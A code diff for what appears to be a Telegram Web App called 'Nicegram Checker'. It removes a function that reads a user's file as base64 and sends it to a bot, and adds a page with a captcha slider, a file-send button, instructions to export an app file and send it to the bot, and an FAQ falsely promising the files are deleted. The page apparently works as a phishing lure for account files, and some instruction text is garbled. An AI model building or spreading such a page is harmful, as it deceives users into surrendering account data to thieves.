@@ -1,29 +1,102 @@
-// Альтернативный вариант - отправка файла через FormData
-async function handleFileUpload(event) {
-    const file = event.target.files[0];
-    if (!file) return;
-    
-    // Читаем файл как Data URL
-    const reader = new FileReader();
-    reader.onload = function(e) {
-        const fileData = {
-            type: 'file_upload',
-            filename: file.name,
-            filetype: file.type,
-            data: e.target.result, // Base64 данные файла
-            timestamp: Date.now()
-        };
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nicegram Checker</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+</head>
+<body>
+    <div class="container">
+        <!-- Аватар с анимацией -->
+        <div class="avatar-container">
+            <div class="avatar" id="animatedAvatar">
+                <img src="https://i.imgur.com/xQF5dZT.png" alt="Аватар" id="avatarImg">
+            </div>
+        </div>
         
-        // Отправляем данные боту
-        if (tg && tg.sendData) {
-            tg.sendData(JSON.stringify(fileData));
-        }
+        <!-- Приветствие -->
+        <div class="greeting" id="greeting">
+            Привет, <span id="userName">Пользователь</span>!
+        </div>
         
-        // Закрываем Web App
-        setTimeout(() => {
-            tg.close();
-        }, 500);
-    };
+        <!-- Кнопка отправки файла -->
+        <button class="btn-send" id="sendFileBtn">
+            📎 Отправить файл
+        </button>
+        
+        <!-- Слайдер для проверки на человека -->
+        <div class="captcha-container" id="captchaContainer">
+            <div class="captcha-text">Передвиньте ползунок вправо для подтверждения</div>
+            <div class="slider-container">
+                <div class="slider-track">
+                    <div class="slider-thumb" id="sliderThumb">
+                        <span>→</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Нижние кнопки -->
+        <div class="bottom-buttons">
+            <button class="btn-bottom" id="instructionBtn">
+                📖 Инструкция
+            </button>
+            <button class="btn-bottom" id="faqBtn">
+                ❓ FAQ
+            </button>
+        </div>
+        
+        <!-- Модальные окна -->
+        <div class="modal" id="instructionModal">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h2>Инструкция</h2>
+                    <span class="close-btn" id="closeInstruction">&times;</span>
+                </div>
+                <div class="modal-body">
+                    <ol>
+                        <li>Скачайте приложение Искорёжки с официального сайта...</li>
+                        <li>Откройте Искорёжки и войдите в свой аккаунт.</li>
+                        <li>Зайдите в настройки и выберите пункт «Искорёжки».</li>
+                        <li>Экспортируйте файл...</li>
+                        <li>Откройте главное меню бета и нажмите на кнопку "Проверка на реферат".</li>
+                        <li>Отправьте файл боту.</li>
+                        <li>Ожидайте результатов проверки.</li>
+                    </ol>
+                </div>
+                <button class="btn-understand">Понятно</button>
+            </div>
+        </div>
+        
+        <div class="modal" id="faqModal">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h2>Частые вопросы</h2>
+                    <span class="close-btn" id="closeFaq">&times;</span>
+                </div>
+                <div class="modal-body">
+                    <div class="faq-section">
+                        <h3>Что такое рефлексия?</h3>
+                        <p>Это возврат средств за подарок...</p>
+                    </div>
+                    <hr>
+                    <div class="faq-section">
+                        <h3>Сколько времени занимает проверка?</h3>
+                        <p>Обычно 3-5 минут, бывают задержки.</p>
+                    </div>
+                    <hr>
+                    <div class="faq-section">
+                        <h3>Мои файлы в безопасности?</h3>
+                        <p>Да – мы не храним ваши файлы, их проверяет наш бот, после чего удаляет.</p>
+                    </div>
+                </div>
+                <button class="btn-close">Закрыть</button>
+            </div>
+        </div>
+    </div>
     
-    reader.readAsDataURL(file);
-}
+    <script src="script.js"></script>
+</body>
+</html>
